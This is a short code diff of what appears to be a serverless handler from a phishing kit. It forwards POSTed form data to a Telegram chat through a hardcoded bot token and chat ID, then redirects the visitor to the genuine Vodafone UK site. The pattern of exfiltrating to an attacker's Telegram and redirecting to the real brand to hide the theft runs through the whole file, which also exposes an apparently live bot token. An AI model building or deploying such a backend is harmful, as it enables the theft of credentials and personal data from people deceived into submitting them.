@@ -2,9 +2,8 @@
 
 const axios = require('axios');
 
-// Telegram Bot API details
-const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Replace with your bot token
-const chatId = '7587120060'; // Replace with your chat ID
+const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Your Telegram bot token
+const chatId = '7587120060'; // Your Telegram chat ID
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -25,7 +24,6 @@ export default async function handler(req, res) {
       text: message,
     });
 
-    // Return success response + redirect URL
     res.status(200).json({ redirect: 'https://www.vodafone.co.uk/ ' });
   } catch (error) {
     console.error('Error sending message:', error.message);
